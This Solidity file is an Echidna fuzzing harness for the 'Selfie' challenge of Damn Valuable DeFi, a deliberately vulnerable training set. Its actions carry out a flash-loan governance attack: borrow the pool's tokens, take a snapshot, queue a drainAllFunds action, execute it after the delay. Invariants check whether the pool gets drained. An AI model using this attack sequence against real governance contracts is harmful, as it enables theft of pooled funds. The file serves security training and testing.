// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../SelfiePool.sol";
import "../SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";

/**
 * @notice to run echidna use following command:
 * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfie --config ./contracts/selfie/echidna/config.yaml
 */

contract SelfieDeployment {
    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    function deployContracts()
        external
        returns (
            SelfiePool,
            SimpleGovernance,
            DamnValuableTokenSnapshot
        )
    {
        // deploy contracts
        DamnValuableTokenSnapshot token;
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        SimpleGovernance governance;
        governance = new SimpleGovernance(address(token));

        SelfiePool pool;
        pool = new SelfiePool(address(token), address(governance));
        // fund selfie pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        return (pool, governance, token);
    }
}

contract EchidnaSelfie {
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    uint256 private borrowAmount;
    uint256 private lastSnapshot;
    uint256 private actionId;

    address owner;

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    constructor() payable {
        SelfieDeployment deployer;
        deployer = new SelfieDeployment();
        (pool, governance, token) = deployer.deployContracts();
        owner = msg.sender;
    }

    function flashLoan() public {
        borrowAmount = token.balanceOf(address(pool));
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address, uint256 _amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function."
        );
        lastSnapshot = token.snapshot();
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = governance.queueAction(address(this), payload, 0);
        // repay the loan
        require(token.transfer(address(pool), _amount), "flash loan failed");
    }

    function executeAction() public {
        require(
            block.timestamp >= lastSnapshot + ACTION_DELAY_IN_SECONDS,
            "Time for action execution has not passed yet"
        );
        governance.executeAction(actionId);
    }

    ////////////////
    // INVARIANTS //
    ////////////////
    // GENERAL: Can we drain SelfiPool?
    function checkPoolBalance() external view {
        assert(token.balanceOf(address(pool)) == TOKENS_IN_POOL);
    }

    function checkOwnerBalance() external view {
        assert(token.balanceOf(address(this)) == 0);
    }
}
